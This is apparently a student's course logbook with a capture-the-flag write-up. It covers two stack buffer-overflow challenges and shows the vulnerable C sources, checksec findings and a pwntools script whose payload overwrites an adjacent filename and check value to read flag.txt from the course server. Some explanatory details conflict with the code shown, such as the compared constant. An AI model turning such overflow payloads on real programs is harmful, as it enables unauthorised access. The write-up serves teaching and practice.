# Trabalho realizado na Semana #5 - SEED Labs - Buffer-Overflow Attack Lab (Set-UID Version)

## Task 1

## Task 2

## Task 3

## Task 4



# CTF - Control The Flag

## Desafio 1:
1. Initially we started by installing the pwntools and the packet checksec, and the zip files containing an executable called program, a main.c file and a python script called exploit-example.py

2. Right after, we executed the checksec command on the terminal and we got the following results:

![checksec](/Logbooks/img/Week5/checksekProgram.png)

**Observations:**
- x86 Architecture
- No cannary to protect return adress
- Stack has execute permissions - NX
- The binary positions aren't randomized
- There are memory regions with RMX permissions (Read, Write and Execute)

3. We check the given program and python script, namely main.c and exploit-example.py:

**main.c:**
```c++
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%40s", &buffer);

    printf("Echo %s\n", buffer);

    printf("I like what you got!\n");
    
    FILE *fd = fopen(meme_file,"r");
    
    while(1){
        if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
            printf("%s", buffer);
        } else {
            break;
        }
    }


    fflush(stdout);
    
    return 0;
}
```

**exploit-example.py:**
```python
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4003)

r.recvuntil(b":")
r.sendline(b"Tentar nao custa")
r.interactive()
```

**Observations:**
- There isn't a function there checks overflows
- The buffer value is read through scanf(), an input function
- The file is saved in an array that is located right above the variable buffer
- Flag is saved in a text file called flag.txt


4. To cause an overflow, we should fill the buffer with an input of 32 characters and at the end, to open the file that contains the flag (flag.txt), we insert the name of that file.

5. This way, the flag.txt is going to be opened and the flag that it contains is going to be printed in the terminal:

![flag1](/Logbooks/img/Week5/flag.png)


## Desafio 2:

1. On this challenge, we now contain a different main.c file:

**main.c**
```c++
#include <stdio.h>
#include <stdlib.h>

int main() {
    char val[4] = "\xef\xbe\xad\xde";
    char meme_file[9] = "mem.txt\0\0";
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%45s", &buffer);
    if(*(int*)val == 0xfefc2324) {
        printf("I like what you got!\n");
        
        FILE *fd = fopen(meme_file,"r");
        
        while(1){
            if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
                printf("%s", buffer);
            } else {
                break;
            }
        }
    } else {
        printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
    }

    fflush(stdout);
    
    return 0;
}
```

**Observations:**
In comparison with the previous main file:
- This one checks if a value as been altered without knowing `if(*(long*)val == 0xfefc2122)`
- There is another buffer called val that is situated between buffer and meme_file. This provides a little more protection.
- In case the value of val is not valid, an error message is printed

2. Initially, we started by executing again the checksec command, that gave us the same information

![checksec2](/Logbooks/img/Week5/checksekProgram2.png)

3. To overflow this system we follow the same strategy from the previous *Desafio* but now we should also add to the input the address that is beeing compared to the val buffer (0xfefc2122), used to check if something was adulterated

4. To do such thing, we changed the given exploit-example.py so that the main.c function receives the exact input to unlock the flag contained in the flag.txt file. We named that script exploit.py

**exploit.py:**
```python
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4000)

r.recvuntil(b":")
r.sendline(b"qwertyuiopasdfghjklzxcvbnmqwerty\x24\x23\xfc\xfeflag.txt")
r.interactive()
```

4. Finally, we obtained the following results:

![flag2](/Logbooks/img/Week5/flag2.png)
